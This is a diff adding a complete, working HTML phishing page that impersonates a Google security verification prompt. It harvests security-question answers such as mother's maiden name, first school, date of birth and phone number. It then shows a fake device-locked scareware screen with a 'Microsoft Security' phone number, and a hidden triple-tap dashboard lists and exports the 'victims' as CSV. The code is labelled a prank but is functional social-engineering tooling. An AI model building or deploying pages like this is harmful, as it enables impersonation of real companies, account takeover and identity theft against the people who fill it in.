@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Google Security Verification</title>
+<style>
+  :root{--bg:#000;--card:#0d1117;--accent:#1f6feb;--danger:#d93025;--muted:#8b949e}
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{background:var(--bg);color:#fff;font-family:-apple-system,system-ui,sans-serif;height:100vh;display:flex;justify-content:center;align-items:center}
+  .phone{max-width:380px;width:100%;background:#000;border:12px solid #111;border-radius:40px;padding:20px 15px;box-shadow:0 20px 60px rgba(0,0,0,0.8);position:relative}
+  .logo{text-align:center;margin-bottom:20px}
+  .logo img{height:38px}
+  h1{font-size:20px;font-weight:600;text-align:center;margin:10px 0}
+  .subtitle{color:var(--muted);text-align:center;font-size:14px;line-height:1.4}
+  .card{background:var(--card);border-radius:16px;padding:24px;margin-top:20px;border:1px solid #30363d}
+  label{display:block;margin:16px 0 8px;font-size:14px;color:#fff}
+  input{width:100%;padding:14px;border-radius:12px;border:1px solid #30363d;background:#0d1117;color:#fff;font-size:16px}
+  input:focus{border-color:var(--accent);outline:none}
+  button{width:100%;padding:14px;background:var(--accent);color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:600;margin-top:20px;cursor:pointer}
+  .progress{height:4px;background:#30363d;border-radius:2px;overflow:hidden;margin:20px 0}
+  .progress i{display:block;height:100%;width:0;background:var(--accent);transition:width .3s}
+  .secure{font-size:12px;color:var(--muted);text-align:center;margin-top:16px}
+  
+  /* BIG secret trigger – top 15% of screen */
+  #secretTrigger{position:absolute;top:0;left:0;width:100%;height:15%;z-index:999;opacity:0;cursor:pointer}
+  .eye-hint{position:absolute;top:12px;left:12px;font-size:24px;opacity:0;transition:opacity .3s;z-index:99}
+
+  /* Dashboard */
+  #dashboard{position:fixed;inset:0;background:#000;z-index:10000;padding:20px;overflow-y:auto;display:none;flex-direction:column}
+  #dashboard.open{display:flex}
+  .entry{background:#161b22;padding:15px;border-radius:10px;margin:12px 0;border:1px solid #30363d}
+  .btn-small{padding:8px 16px;background:#333;border-radius:8px;margin:5px;font-size:14px}
+  .danger{background:var(--danger);color:#fff}
+
+  .overlay{position:fixed;inset:0;background:rgba(0,0,0,0.99);display:flex;align-items:center;justify-content:center;z-index:9999;flex-direction:column;color:#fff;text-align:center;padding:20px}
+  .hidden{display:none}
+  .spinner{width:70px;height:70px;border:6px solid #222;border-top:6px solid var(--accent);border-radius:50%;animation:s 1s linear infinite;margin:20px auto}
+  @keyframes s{to{transform:rotate(360deg)}}
+  .virus{background:#8b0000;padding:40px 20px;border-radius:16px;max-width:90%}
+  .virus h2{font-size:36px;margin:20px 0 10px}
+  .timer{font-size:70px;font-weight:800;color:#ff2222;margin:15px 0}
+  .big-btn{background:#333;padding:16px 32px;border-radius:12px;font-size:18px;margin:20px auto;display:inline-block}
+</style>
+</head>
+<body>
+
+<div class="phone">
+  <!-- HUGE invisible trigger + tiny eye hint -->
+  <div id="secretTrigger"></div>
+  <div class="eye-hint" id="eye">👁</div>
+
+  <div class="logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
+  <h1>Security Verification Required</h1>
+  <p class="subtitle">Unusual login attempt detected from a new device. Verify your identity to continue.</p>
+  
+  <div class="card">
+    <div class="steps">
+      <div class="step active" id="s1"><label>Full name (as on Aadhaar/PAN)</label><input id="q1" placeholder="Priya Sharma"></div>
+      <div class="step" id="s2"><label>Email address</label><input id="q2" type="email" placeholder="priya@gmail.com"></div>
+      <div class="step" id="s3"><label>Date of birth</label><input id="q3" placeholder="15/08/1998"></div>
+      <div class="step" id="s4"><label>Mother's maiden name</label><input id="q4" placeholder="Patel"></div>
+      <div class="step" id="s5"><label>Phone number</label><input id="q5" placeholder="+919876543210"></div>
+      <div class="step" id="s6"><label>First school name</label><input id="q6" placeholder="Delhi Public School"></div>
+      <div class="step" id="s7"><label>City of birth</label><input id="q7" placeholder="Mumbai"></div>
+    </div>
+    <button onclick="next()">Continue →</button>
+    <div class="progress"><i id="bar"></i></div>
+    <div class="secure">Your data is encrypted and sent securely to Google servers.</div>
+  </div>
+</div>
+
+<!-- Scanning -->
+<div id="scan" class="overlay hidden">
+  <h2>Verifying identity...</h2>
+  <div class="spinner"></div>
+  <p id="scanText">Checking device fingerprint...</p>
+</div>
+
+<!-- Scary Lock Screen -->
+<div id="locked" class="overlay hidden">
+  <div class="virus">
+    <h2>YOUR DEVICE IS LOCKED</h2>
+    <p>Suspicious activity detected<br>Your personal data has been encrypted</p>
+    <div class="timer" id="timer">00:20</div>
+    <p>To unlock immediately, call Microsoft Security</p>
+    <div class="big-btn" onclick="gotcha()">Call +1 (888) 851-2911</div>
+    <p style="margin-top:20px;font-size:14px">Case ID: IN-2025-7841</p>
+  </div>
+</div>
+
+<!-- Dashboard -->
+<div id="dashboard">
+  <h2 style="text-align:center;margin:20px 0">Prank Victims 😂</h2>
+  <div style="text-align:center">
+    <button class="btn-small" onclick="exportCSV()">Export CSV</button>
+    <button class="btn-small danger" onclick="if(confirm('Delete all?')){localStorage.removeItem('victims');loadVictims()}">Clear All</button>
+    <button class="btn-small" onclick="document.getElementById('dashboard').classList.remove('open')">Close</button>
+  </div>
+  <div id="list" style="margin-top:20px"></div>
+</div>
+
+<div id="confetti"></div>
+
+<script>
+// === TRIPLE-TAP TO OPEN DASHBOARD (now works perfectly) ===
+let tapCount = 0;
+const trigger = document.getElementById('secretTrigger');
+const eye = document.getElementById('eye');
+
+trigger.addEventListener('click', () => {
+  tapCount++;
+  eye.style.opacity = '0.15';                // tiny hint only you see
+  setTimeout(() => eye.style.opacity = '0', 500);
+
+  if (tapCount === 3) {
+    document.getElementById('dashboard').classList.add('open');
+    loadVictims();
+    tapCount = 0;
+  } else {
+    setTimeout(() => { if(tapCount < 3) tapCount = 0; }, 1500);  // generous window
+  }
+});
+
+// Rest of your existing code (unchanged)
+const steps = 7;
+let step = 1;
+
+function next(){
+  const val = document.getElementById('q'+step).value.trim();
+  if(!val) return alert("This field is required");
+  
+  document.getElementById('s'+step).classList.remove('active');
+  step++;
+  if(step <= steps) document.getElementById('s'+step).classList.add('active');
+  else finalize();
+  
+  document.getElementById('bar').style.width = ((step-1)/steps*100)+'%';
+}
+
+function finalize(){
+  const data = {
+    name: document.getElementById('q1').value.trim(),
+    email: document.getElementById('q2').value.trim(),
+    dob: document.getElementById('q3').value.trim(),
+    mother: document.getElementById('q4').value.trim(),
+    phone: document.getElementById('q5').value.trim(),
+    school: document.getElementById('q6').value.trim(),
+    city: document.getElementById('q7').value.trim(),
+    time: new Date().toLocaleString()
+  };
+  
+  let victims = JSON.parse(localStorage.getItem('victims')||'[]');
+  victims.unshift(data);
+  localStorage.setItem('victims', JSON.stringify(victims));
+  
+  document.getElementById('scan').classList.remove('hidden');
+  const msgs = ["Verifying identity...", "Checking fraud database...", "Scanning device...", "CRITICAL THREAT FOUND!"];
+  let i=0;
+  const iv = setInterval(()=>{ if(i<msgs.length) document.getElementById('scanText').textContent = msgs[i++]; }, 2000);
+  
+  setTimeout(()=>{
+    clearInterval(iv);
+    document.getElementById('scan').classList.add('hidden');
+    document.getElementById('locked').classList.remove('hidden');
+    startTimer(20);
+  }, 8500);
+}
+
+function startTimer(sec){
+  const t = document.getElementById('timer');
+  const int = setInterval(()=>{
+    sec--;
+    t.textContent = '00:' + (sec<10?'0':'') + sec;
+    if(sec <= 0){ clearInterval(int); gotcha(); }
+  },1000);
+}
+
+function gotcha(){
+  document.getElementById('locked').classList.add('hidden');
+  confettiExplosion();
+  setTimeout(()=>alert("GOTCHA!!! 😂😂😂\n\nThis was a PRANK!\nAll your answers are saved for me to laugh at forever!"), 800);
+}
+
+function confettiExplosion(){
+  const colors = ['#ff0000','#00ff00','#0000ff','#ffff00','#ff00ff','#00ffff'];
+  for(let i=0;i<150;i++){
+    setTimeout(()=>{
+      const c = document.createElement('div');
+      c.style.position='fixed'; c.style.left=Math.random()*100+'vw'; c.style.top='-10px';
+      c.style.width='10px'; c.style.height='20px'; c.style.background=colors[Math.floor(Math.random()*colors.length)];
+      c.style.transform=`rotate(${Math.random()*360}deg)`;
+      c.style.animation='fall 4s linear forwards';
+      document.getElementById('confetti').appendChild(c);
+      setTimeout(()=>c.remove(),5000);
+    },i*30);
+  }
+}
+
+function loadVictims(){
+  const list = document.getElementById('list');
+  const data = JSON.parse(localStorage.getItem('victims')||'[]');
+  list.innerHTML = data.length===0 ? '<p style="text-align:center;color:#888">No victims yet 😈</p>' : '';
+  data.forEach((v,i)=>{
+    const div = document.createElement('div');
+    div.className='entry';
+    div.innerHTML = `
+      <strong>${v.name}</strong> <small>${v.time}</small><br>
+      📧 ${v.email}<br>🎂 ${v.dob} | 🤱 ${v.mother}<br>📱 ${v.phone}<br>🏫 ${v.school} | 🌆 ${v.city}
+      <button class="btn-small danger" onclick="deleteVictim(${i})">Delete</button>
+    `;
+    list.appendChild(div);
+  });
+}
+
+window.deleteVictim = function(i){
+  let d = JSON.parse(localStorage.getItem('victims')||'[]');
+  d.splice(i,1);
+  localStorage.setItem('victims', JSON.stringify(d));
+  loadVictims();
+};
+
+function exportCSV(){
+  const data = JSON.parse(localStorage.getItem('victims')||'[]');
+  if(data.length===0) return alert("No data");
+  let csv = "Name,Email,DOB,Mother's Name,Phone,School,City,Time\n";
+  data.forEach(v=>csv += `"${v.name}","${v.email}","${v.dob}","${v.mother}","${v.phone}","${v.school}","${v.city}","${v.time}"\n`);
+  const blob = new Blob([csv],{type:'text/csv'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a'); a.href=url; a.download='prank_victims.csv'; a.click();
+}
+
+document.addEventListener('keydown', e=>{ if(e.key==='Enter') next(); });
+
+const style = document.createElement('style');
+style.textContent = `@keyframes fall{to{transform:translateY(110vh) rotate(720deg);opacity:0}}`;
+document.head.appendChild(style);
+</script>
+</body>
+</html>
